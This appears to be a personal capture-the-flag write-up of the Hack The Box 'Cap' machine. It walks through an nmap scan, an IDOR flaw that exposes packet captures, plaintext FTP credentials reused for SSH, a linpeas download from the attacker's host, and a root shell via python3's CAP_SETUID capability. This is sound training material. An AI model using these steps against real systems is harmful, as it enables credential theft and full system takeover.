Machine Name: Cap

Released On: 06/05/21

Difficulty: Easy

Completed On: 11/09/25

After previously completing Lame, the first box released on HTB I was recommended to try out Cap. It sounded pretty interesting so I dove in. I first completed this box months ago in the guided mode as part of my training, but now that I've done many more labs and forgotten the details of this one I wanted to give it a shot in the adventure mode.

First off I ran nmap -sV 10.10.10.245 on the machine. 

![nmap scan results](../assets/Cap-HTB/nmapscan.png "Nmap scan results")

Alright so we have 3 different services running, FTP, SSH, and HTTP. To start with I decided to use my web browser to connect to the web server running on the machine. I always begin with adding the target machines IP to my hosts file by running sudo nano /etc/hosts and then adding 10.10.10.245     cap.htb to the file. 

when navigating to http://cap.htb it drops us into a dashboard where are are already logged in as a user named Nathan. 

![Website running on HTTP server](../assets/Cap-HTB/webdashboard.png "Website running on HTTP server")

After exploring the web page we have 4 known working URL's
http://cap.htb - The main dashboard for the website
http://cap.htb/data/3 - A page that lets you download a 5 second PCAP of network traffic
http://cap.htb/ip - The results of running the ifconfig command on the machine running the webserver.
http://cap.htb/netstat - The results of running the netstat command on the machine running the webserver.

The only thing of immediate interest to me was the PCAP download page. The file available for us to download has no contents but I was curios of the /3 at the end of the URL is able to be modified to view other files, I decided to continue scoping out the other services and circle back to this one.

A quick check in on the FTP service running vsFTPd 3.0.3 shows no vulnerabilities that would help us get a foothold and anonymous login is disabled. The SSH service OpenSSH 8.2p1 showed nothing of interest as well. So I decided to go back to the website. 

I changed http://cap.htb/data/3 to http://cap.htb/data/2 and confirmed it loaded a new page with a different PCAP file, a pretty classic IDOR vulnerability. I manually enmurated the pages ranging from 0-9, with the only ones actually loading being 0-4. I decided since data/0 contained the most traffic that I should begin there.

Grabbing the PCAP file and opening it in Wireshark shows us that we have TCP, HTTP, and FTP traffic. Knowing that FTP traffic is unencreypted I chose to look there first. Filtering by protocol I grabbed the first FTP packet and followed the TCP stream in Wireshark. 

![FTP traffic in Wireshark](../assets/Cap-HTB/wiresharkftp.png "FTP traffic in Wireshark")

Very nice right at the beginning we see a plain text login for the user Nathan, now knowing a username and password combo I thought I should try it out on our last untapped service, SSH. Using those credentials to SSH into the target machine worked and we found the user flag in Nathan's home directory.

![User flag in SSH terminal](../assets/Cap-HTB/sshuserflag.png "User flag in SSH terminal")

After getting a user shell on the target machine I knew I needed to look into methods of privelege escalation. This is still something I am learning and practicing for Linux so I decided to take a slightly easier route and use a premade script called linpeas. Linpeas automatically checks a lot of common channels for privesc on Linux boxes and provides the results in a digestable format suitable for nearly all skill levels. Best of all the script is easy to run and comes pre downloaded on most installs of Kali.

By default the linpeas.sh script should be stored in /usr/share/peass/linpeas. I copied the linpeas.sh file from here to my folder for this machine to keep track of the resources I used. I opened a terminal in the directory where linpeas.sh was stored and fired up a quick python webserver with python3 -m http.server 9000. Then from the SSH terminal I double checked that we were in Nathans home directory which should be fine to download the script into and then ran wget http://10.10.14.68:9000/linpeas.sh After confirming that the file downloaded I ran chmod +x linpeas.sh to add execute permissions to the file. Finally we were ready to run the script. 

![Setting up linpeas using SSH](../assets/Cap-HTB/sshlinpeas.png "Setting up linpeas using SSH")

Now if you're anything like me at first trying to navigate the output of linpeas can be overwhelming, but it provides a color code for us and I always like to start by looking for the low hanging fruit highlighted in red/yellow. And sure enough linpeas identified the python3 binary as having the CAP_SETUID capability which can be exploited. 

![Result from running linpeas](../assets/Cap-HTB/linpeasresult.png "Result from running linpeas")

I had remembered from previous labs that when trying to exploit and kind of binary GTFOBins is a great resource. I looked up Python on GTFOBins and navigated to the Capabilities section which gave me 2 commands to run. 

sudo setcap cap_setuid+ep python
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'

I used Nathan's password that I previously found for the first command and on the second command I had to change the ./python to the path of the vulnerable binary that linpeas found which was /usr/bin/python3.8 After running the second command we get a root shell and find the root flag in /root!

![Root shell from Python exploit](../assets/Cap-HTB/rootshell.png "Root shell from Python exploit")
